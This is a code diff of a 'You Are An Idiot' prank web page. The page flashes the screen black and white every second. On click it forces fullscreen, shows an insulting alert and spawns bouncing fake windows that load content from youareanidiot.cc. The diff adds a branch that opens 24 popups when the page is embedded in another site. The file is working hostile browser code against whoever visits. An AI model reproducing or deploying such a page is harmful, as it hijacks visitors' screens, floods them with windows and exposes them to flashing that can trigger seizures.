@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <title>You Are An Idiot</title>
-
 <style>
 html, body {
     margin: 0;
@@ -14,8 +13,6 @@ html, body {
     background: black;
     cursor: pointer;
 }
-
-/* Fake window */
 .fake-window {
     position: absolute;
     width: 320px;
@@ -26,8 +23,6 @@ html, body {
     font-family: Segoe UI, sans-serif;
     user-select: none;
 }
-
-/* Title bar */
 .title-bar {
     height: 30px;
     background: #e5e5e5;
@@ -35,8 +30,6 @@ html, body {
     justify-content: flex-end;
     align-items: center;
 }
-
-/* Buttons */
 .btn {
     width: 45px;
     height: 100%;
@@ -44,45 +37,27 @@ html, body {
     line-height: 30px;
     cursor: pointer;
 }
-
-.btn:hover {
-    background: #ccc;
-}
-
-.btn.close:hover {
-    background: red;
-    color: white;
-}
-
-/* Iframe */
-.fake-window iframe {
-    width: 100%;
-    height: calc(100% - 30px);
-    border: none;
-}
+.btn:hover { background: #ccc; }
+.btn.close:hover { background: red; color: white; }
+.fake-window iframe { width: 100%; height: calc(100% - 30px); border: none; }
 </style>
 </head>
-
 <body>
-
 <script>
-/* Flash background every 1 second */
+// Flash background
 let isBlack = true;
 setInterval(() => {
     document.body.style.backgroundColor = isBlack ? "black" : "white";
     isBlack = !isBlack;
 }, 1000);
 
-/* Store windows */
 const windows = [];
 
-/* Create a fake popup window at x,y */
 function createWindow(x = 0, y = 0) {
     const win = document.createElement("div");
     win.className = "fake-window";
     win.style.left = x + "px";
     win.style.top = y + "px";
-
     document.body.appendChild(win);
     windows.push(win);
 
@@ -95,62 +70,59 @@ function createWindow(x = 0, y = 0) {
         const minimizeBtn = titleBar.querySelector(".minimize");
         const closeBtn = titleBar.querySelector(".close");
 
-        minimizeBtn.addEventListener("click", (e) => {
+        minimizeBtn.addEventListener("click", e => {
             e.stopPropagation();
             win.style.display = "none";
             setTimeout(() => win.style.display = "block", 1000);
         });
 
-        closeBtn.addEventListener("click", (e) => {
+        closeBtn.addEventListener("click", e => {
             e.stopPropagation();
             win.remove();
         });
     }
 
-    // 1.5s delay → load iframe + start bouncing
+    // Wait 1.5s then load iframe and start bouncing
     setTimeout(() => {
         win.innerHTML = `<iframe src="https://youareanidiot.cc/lol.html"></iframe>`;
         addButtons();
 
-        let dx = (Math.random() * 20 + 15) * (Math.random() > 0.5 ? 1 : -1);
-        let dy = (Math.random() * 20 + 15) * (Math.random() > 0.5 ? 1 : -1);
+        let dx = (Math.random()*20+15)*(Math.random()>0.5?1:-1);
+        let dy = (Math.random()*20+15)*(Math.random()>0.5?1:-1);
 
         function move() {
             const rect = win.getBoundingClientRect();
             let x = rect.left + dx;
             let y = rect.top + dy;
-
-            if (x <= 0 || x + rect.width >= window.innerWidth) dx *= -1;
-            if (y <= 0 || y + rect.height >= window.innerHeight) dy *= -1;
-
+            if (x<=0 || x+rect.width>=window.innerWidth) dx*=-1;
+            if (y<=0 || y+rect.height>=window.innerHeight) dy*=-1;
             win.style.left = x + "px";
             win.style.top = y + "px";
-
             requestAnimationFrame(move);
         }
-
         move();
-    }, 1500);
+    },1500);
 }
 
-/* Click anywhere → fullscreen, alert + spawn 6 windows */
-document.addEventListener("click", (e) => {
-    // Request fullscreen
-    if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen();
-    } else if (document.documentElement.webkitRequestFullscreen) {
-        document.documentElement.webkitRequestFullscreen();
-    } else if (document.documentElement.msRequestFullscreen) {
-        document.documentElement.msRequestFullscreen();
+// On click
+document.addEventListener("click", e=>{
+    alert("You are an idiot!");
+    // Spawn 6 in-page windows
+    for(let i=0;i<6;i++) createWindow(0,0);
+
+    // If embedded in another site
+    if(window.top !== window.self){
+        for(let i=0;i<24;i++){
+            let popup = window.open("https://youareanidiot.cc/lol","_blank","width=400,height=300");
+            // Note: to make bouncing inside the popup work, lol.html should contain similar JS
+        }
     }
 
-    // Alert
-    alert("You are an idiot!");
-
-    // Spawn 6 windows
-    for (let i = 0; i < 6; i++) createWindow(0, 0);
+    // Fullscreen
+    if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+    else if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
+    else if(document.documentElement.msRequestFullscreen) document.documentElement.msRequestFullscreen();
 });
 </script>
-
 </body>
 </html>
